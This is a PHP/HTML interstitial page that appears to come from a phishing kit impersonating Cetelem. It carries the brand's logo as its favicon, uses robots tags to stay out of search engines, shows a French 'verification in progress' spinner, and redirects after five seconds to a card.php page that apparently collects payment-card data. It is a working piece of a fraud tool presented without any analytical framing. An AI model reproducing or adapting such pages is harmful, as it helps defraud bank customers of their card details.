<?php

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex,nofollow,noarchive">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta http-equiv="refresh" content="5;URL=card.php">
    <script src=""></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/iview.js"
        integrity="sha256-Xjd66VohnxGyWXo6t7jy6Jdpa4MapbhWGgzRNcsnnzY=" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/iview/3.5.1/styles/iview.css"
        integrity="sha256-wrmzmt34CAQJ3ChhG+ZHZNhwVTDrlLGhLAS7tlbgfZM=" crossorigin="anonymous" />
    <link rel="icon" href="https://1000marcas.net/wp-content/uploads/2020/07/Cetelem-logo-1.png" sizes="32x32">
    <link rel="icon" href="https://1000marcas.net/wp-content/uploads/2020/07/Cetelem-logo-1.png" sizes="192x192">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.js"
        integrity="sha256-XmdRbTre/3RulhYk/cOBUMpYlaAp2Rpo/s556u0OIKk=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js"
        integrity="sha256-bQmrZe4yPnQrLTY+1gYylfNMBuGfnT/HKsCGX+9Xuqo=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/js/uikit.js"
        integrity="sha256-A7WGGnbT0f0OYHWQVkWqX6GQdZHZDi8IsbD/u+FQaVc=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js"
        integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.css"
        integrity="sha256-QVBN0oT74UhpCtEo4Ko+k3sNo+ykJFBBtGduw13V9vw=" crossorigin="anonymous" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.js"
        integrity="sha256-qs5p0BFSqSvrstBxPvex+zdyrzcyGdHNeNmAirO2zc0=" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/css/uikit.css"
        integrity="sha256-zXcP0t9LAKMmi8DraWUaFJV1qvGkw1gYEHBbf+IsHSo=" crossorigin="anonymous" />
    <title>Chargement...</title>
    <style>

    </style>
</head>

<body>
    <div id="index">
        <div v-show="loading">
            <div class="uk-position-center">
                <div class="uk-text-center">
                    <p>
                        <img src="https://media0.giphy.com/media/cLkxQILGz9BecXTaF6/giphy.gif?cid=6c09b952y3x0e4brsjus7wyyfjv26rohugar743hlcvjm2k8&ep=v1_stickers_related&rid=giphy.gif&ct=s" alt="" width="50%">
                    </p>
                    <div class="primary" uk-spinner></div> <br>
                    <h3>
                        <b>Vérification en cours<BR>S'il vous plaît, attendez...</b>
                    </h3>
                </div>
            </div>
        </div>
    </div>
</body>

</html>